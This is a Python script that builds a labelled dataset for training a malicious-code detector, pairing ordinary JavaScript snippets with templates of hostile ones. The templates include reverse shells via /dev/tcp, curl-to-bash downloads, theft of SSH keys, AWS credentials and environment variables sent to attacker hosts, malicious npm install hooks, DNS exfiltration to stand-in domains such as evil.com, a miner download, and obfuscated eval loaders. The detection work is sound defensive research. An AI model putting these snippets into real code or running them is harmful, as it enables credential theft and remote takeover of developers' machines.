"""
Generate synthetic training dataset for malicious code detection.
Creates labeled (malicious/benign) code snippets based on real-world attack patterns.
"""

import json
import random
import os

OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "..", "data")

# --- Malicious code templates ---

MALICIOUS_TEMPLATES = {
    "eval_base64": [
        'eval(atob("{b64}"))',
        'eval(Buffer.from("{b64}", "base64").toString())',
        'new Function(atob("{b64}"))()',
        'const fn = new Function(Buffer.from("{b64}","base64").toString()); fn();',
        'setTimeout(atob("{b64}"), 0)',
        '(0, eval)(atob("{b64}"))',
    ],
    "env_exfiltration": [
        'fetch("http://{ip}:{port}/collect", {{ method: "POST", body: JSON.stringify(process.env) }})',
        'const http = require("http"); http.request({{ hostname: "{ip}", port: {port}, path: "/env", method: "POST" }}, ()=>{{}}).end(JSON.stringify(process.env))',
        'axios.post("http://{ip}:{port}/data", {{ env: process.env, cwd: process.cwd() }})',
        'require("https").get("https://{ip}/steal?data=" + encodeURIComponent(JSON.stringify(process.env)))',
        'const data = Buffer.from(JSON.stringify(process.env)).toString("base64"); fetch("http://{ip}/c?d=" + data)',
    ],
    "reverse_shell": [
        'const net = require("net"); const cp = require("child_process"); const sh = cp.spawn("/bin/sh", []); const client = new net.Socket(); client.connect({port}, "{ip}", function(){{ sh.stdin.pipe(client); client.pipe(sh.stdout); client.pipe(sh.stderr); }});',
        'require("child_process").exec("bash -i >& /dev/tcp/{ip}/{port} 0>&1")',
        'const {{ execSync }} = require("child_process"); execSync("curl http://{ip}:{port}/shell.sh | bash")',
        'require("child_process").exec("powershell -e " + "{b64}")',
    ],
    "credential_theft": [
        'const fs = require("fs"); const key = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa", "utf-8"); fetch("http://{ip}/k", {{ method: "POST", body: key }})',
        'const {{ execSync }} = require("child_process"); const gitConfig = execSync("git config --list").toString(); fetch("http://{ip}/g", {{ method: "POST", body: gitConfig }})',
        'const npmrc = require("fs").readFileSync(process.env.HOME + "/.npmrc", "utf-8"); require("https").get("https://{ip}/t?d=" + encodeURIComponent(npmrc))',
        'const fs = require("fs"); const awsCreds = fs.readFileSync(process.env.HOME + "/.aws/credentials", "utf-8"); fetch("http://{ip}:{port}/aws", {{ method: "POST", body: awsCreds }})',
    ],
    "obfuscated_loader": [
        'const _0x{hex1}=["{encoded_str}"]; (function(_0x{hex2},_0x{hex3}){{ const _0x{hex4}=function(_0x{hex5}){{ while(--_0x{hex5}){{ _0x{hex2}.push(_0x{hex2}.shift()); }} }}; _0x{hex4}(++_0x{hex3}); }})(_0x{hex1},0x{shift});',
        'var _0x{hex1}=["\\x65\\x76\\x61\\x6c","\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72"]; var _0x{hex2}=[_0x{hex1}[0]]; (function(){{ eval(_0x{hex2}[0]); }})();',
        'const chars = "{encoded_str}".split("").reverse().join(""); eval(chars);',
        'let s = ""; for(const c of "{encoded_str}") s += String.fromCharCode(c.charCodeAt(0) ^ {xor_key}); eval(s);',
    ],
    "postinstall_attack": [
        '{{"name":"pkg","version":"1.0.0","scripts":{{"postinstall":"node -e \\"require(\'child_process\').exec(\'curl http://{ip}/s|sh\')\\""}}}}',
        '{{"name":"pkg","version":"1.0.0","scripts":{{"preinstall":"curl -s http://{ip}:{port}/setup.sh | bash"}}}}',
        '{{"name":"pkg","version":"1.0.0","scripts":{{"install":"powershell -EncodedCommand {b64}"}}}}',
    ],
    "crypto_miner": [
        'const {{ execSync }} = require("child_process"); execSync("curl -s http://{ip}/xmrig -o /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o pool.minexmr.com:443 -u {wallet} -k --tls");',
        'const w = new Worker("data:text/javascript," + encodeURIComponent("while(1){{}}"));',
    ],
    "dns_exfil": [
        'const dns = require("dns"); const data = Buffer.from(JSON.stringify(process.env)).toString("hex"); dns.resolve(data.substring(0,63) + ".{domain}", ()=>{{}});',
        'const {{ execSync }} = require("child_process"); execSync("nslookup " + Buffer.from(process.env.HOME).toString("hex") + ".{domain}");',
    ],
    "invisible_unicode": [
        'const x = "normal text\\u200B\\u200B\\u200Bhidden";',
        'const check\\u200D = false; // looks like "check" but is different identifier',
        'if (is\\u200BAdmin) {{ return true; }} // invisible char in identifier',
    ],
    "bidi_trojan": [
        'const access = "user\\u202Enimi\\u202Dda"; // visually looks like "admin"',
        'if (access !== "user\\u202E") {{ \\u202Dreturn true; }}',
    ],
}

# --- Benign code templates ---

BENIGN_TEMPLATES = [
    # Express server
    'const express = require("express"); const app = express(); app.get("/", (req, res) => {{ res.send("Hello World"); }}); app.listen({port});',
    'const app = require("express")(); app.use(express.json()); app.post("/api/users", async (req, res) => {{ const user = await User.create(req.body); res.json(user); }});',
    # File operations
    'const fs = require("fs"); const data = fs.readFileSync("config.json", "utf-8"); const config = JSON.parse(data); console.log(config.name);',
    'const {{ readFile, writeFile }} = require("fs/promises"); async function processFile(input, output) {{ const data = await readFile(input, "utf-8"); await writeFile(output, data.toUpperCase()); }}',
    # Database
    'const {{ Pool }} = require("pg"); const pool = new Pool({{ connectionString: process.env.DATABASE_URL }}); const result = await pool.query("SELECT * FROM users WHERE id = $1", [userId]);',
    'const mongoose = require("mongoose"); const userSchema = new mongoose.Schema({{ name: String, email: String }}); module.exports = mongoose.model("User", userSchema);',
    # React components
    'function Button({{ label, onClick }}) {{ return <button className="btn" onClick={{onClick}}>{{label}}</button>; }}',
    'const [count, setCount] = useState(0); useEffect(() => {{ document.title = `Count: ${{count}}`; }}, [count]);',
    # Utility functions
    'function debounce(fn, delay) {{ let timer; return (...args) => {{ clearTimeout(timer); timer = setTimeout(() => fn(...args), delay); }}; }}',
    'const slugify = (str) => str.toLowerCase().trim().replace(/[^\\w\\s-]/g, "").replace(/[\\s_-]+/g, "-");',
    'function deepClone(obj) {{ return JSON.parse(JSON.stringify(obj)); }}',
    'const groupBy = (arr, key) => arr.reduce((acc, item) => {{ (acc[item[key]] = acc[item[key]] || []).push(item); return acc; }}, {{}});',
    # API calls (legitimate)
    'const response = await fetch("https://api.example.com/data"); const json = await response.json(); return json.results;',
    'axios.get("https://api.github.com/repos/owner/repo").then(res => console.log(res.data));',
    # Crypto (legitimate)
    'const crypto = require("crypto"); const hash = crypto.createHash("sha256").update(password + salt).digest("hex");',
    'const {{ randomBytes }} = require("crypto"); const token = randomBytes(32).toString("hex");',
    # Testing
    'describe("Calculator", () => {{ it("should add two numbers", () => {{ expect(add(2, 3)).toBe(5); }}); }});',
    'test("renders button with label", () => {{ render(<Button label="Click" />); expect(screen.getByText("Click")).toBeInTheDocument(); }});',
    # Config files
    '{{"name": "my-app", "version": "1.0.0", "dependencies": {{"express": "^4.18.0", "mongoose": "^7.0.0"}}}}',
    '{{"compilerOptions": {{"target": "ES2022", "module": "commonjs", "strict": true, "outDir": "./dist"}}}}',
    # Logger
    'const winston = require("winston"); const logger = winston.createLogger({{ level: "info", transports: [new winston.transports.Console()] }});',
    # Auth (legitimate)
    'const jwt = require("jsonwebtoken"); const token = jwt.sign({{ userId: user.id }}, process.env.JWT_SECRET, {{ expiresIn: "24h" }});',
    'const bcrypt = require("bcrypt"); const hashedPassword = await bcrypt.hash(password, 10);',
    # Middleware
    'function authMiddleware(req, res, next) {{ const token = req.headers.authorization?.split(" ")[1]; if (!token) return res.status(401).json({{ error: "Unauthorized" }}); next(); }}',
    # Error handling
    'process.on("unhandledRejection", (reason) => {{ console.error("Unhandled rejection:", reason); process.exit(1); }});',
    'app.use((err, req, res, next) => {{ console.error(err.stack); res.status(500).json({{ error: "Internal server error" }}); }});',
    # Validation
    'const {{ z }} = require("zod"); const userSchema = z.object({{ name: z.string().min(1), email: z.string().email(), age: z.number().int().positive() }});',
    # Streams
    'const readable = fs.createReadStream("input.csv"); const writable = fs.createWriteStream("output.csv"); readable.pipe(transform).pipe(writable);',
    # WebSocket
    'const wss = new WebSocket.Server({{ port: 8080 }}); wss.on("connection", (ws) => {{ ws.on("message", (msg) => {{ ws.send("echo: " + msg); }}); }});',
    # CLI
    'const {{ program }} = require("commander"); program.option("-o, --output <path>", "output directory").parse(process.argv);',
    # Simple math
    'function fibonacci(n) {{ if (n <= 1) return n; return fibonacci(n - 1) + fibonacci(n - 2); }}',
    'const isPrime = (n) => {{ if (n < 2) return false; for (let i = 2; i * i <= n; i++) if (n % i === 0) return false; return true; }};',
    # Array operations
    'const sorted = [...items].sort((a, b) => a.name.localeCompare(b.name));',
    'const unique = [...new Set(array)];',
    'const flattened = arr.flat(Infinity);',
    # Promise patterns
    'const results = await Promise.all(urls.map(url => fetch(url).then(r => r.json())));',
    'const {{ data, error }} = await supabase.from("posts").select("*").order("created_at", {{ ascending: false }}).limit(10);',
    # Event emitter
    'const EventEmitter = require("events"); class MyEmitter extends EventEmitter {{}} const emitter = new MyEmitter(); emitter.on("data", (d) => console.log(d));',
    # Path operations
    'const fullPath = path.resolve(__dirname, "..", "config", "settings.json");',
    'const ext = path.extname(filename).toLowerCase();',
]


def random_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def random_port():
    return str(random.randint(1024, 65535))

def random_hex(length=6):
    return ''.join(random.choices('0123456789abcdef', k=length))

def random_b64():
    payloads = [
        "Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo",
        "cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lkJyk=",
        "cHJvY2Vzcy5lbnYuQVdTX1NFQ1JFVF9BQ0NFU1NfS0VZ",
        "bmV0c3RhdCAtdGxucA==",
        "d2hvYW1p",
    ]
    return random.choice(payloads)

def random_wallet():
    return '0x' + ''.join(random.choices('0123456789abcdef', k=40))

def random_domain():
    domains = ["evil.com", "malware.xyz", "c2.attacker.io", "exfil.bad.net", "steal.data.org"]
    return random.choice(domains)

def fill_template(template):
    return template.format(
        ip=random_ip(),
        port=random_port(),
        b64=random_b64(),
        hex1=random_hex(),
        hex2=random_hex(),
        hex3=random_hex(),
        hex4=random_hex(),
        hex5=random_hex(),
        shift=random.randint(100, 255),
        encoded_str=''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(20, 60))),
        xor_key=random.randint(1, 255),
        wallet=random_wallet(),
        domain=random_domain(),
    )


def generate_dataset(num_malicious=5000, num_benign=5000):
    samples = []

    # Generate malicious samples
    for _ in range(num_malicious):
        category = random.choice(list(MALICIOUS_TEMPLATES.keys()))
        template = random.choice(MALICIOUS_TEMPLATES[category])
        try:
            code = fill_template(template)
        except (KeyError, IndexError):
            code = template
        samples.append({
            "code": code,
            "label": 1,  # malicious
            "category": category,
        })

    # Generate benign samples
    for _ in range(num_benign):
        template = random.choice(BENIGN_TEMPLATES)
        try:
            code = fill_template(template)
        except (KeyError, IndexError):
            code = template
        samples.append({
            "code": code,
            "label": 0,  # benign
            "category": "benign",
        })

    random.shuffle(samples)
    return samples


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    print("Generating training dataset...")
    train_data = generate_dataset(num_malicious=4000, num_benign=4000)

    print("Generating validation dataset...")
    val_data = generate_dataset(num_malicious=500, num_benign=500)

    print("Generating test dataset...")
    test_data = generate_dataset(num_malicious=500, num_benign=500)

    for name, data in [("train", train_data), ("val", val_data), ("test", test_data)]:
        path = os.path.join(OUTPUT_DIR, f"{name}.jsonl")
        with open(path, "w", encoding="utf-8") as f:
            for sample in data:
                f.write(json.dumps(sample, ensure_ascii=False) + "\n")
        print(f"  {name}: {len(data)} samples → {path}")

    # Stats
    for name, data in [("train", train_data), ("val", val_data), ("test", test_data)]:
        mal = sum(1 for s in data if s["label"] == 1)
        ben = sum(1 for s in data if s["label"] == 0)
        print(f"  {name}: {mal} malicious, {ben} benign")


if __name__ == "__main__":
    main()
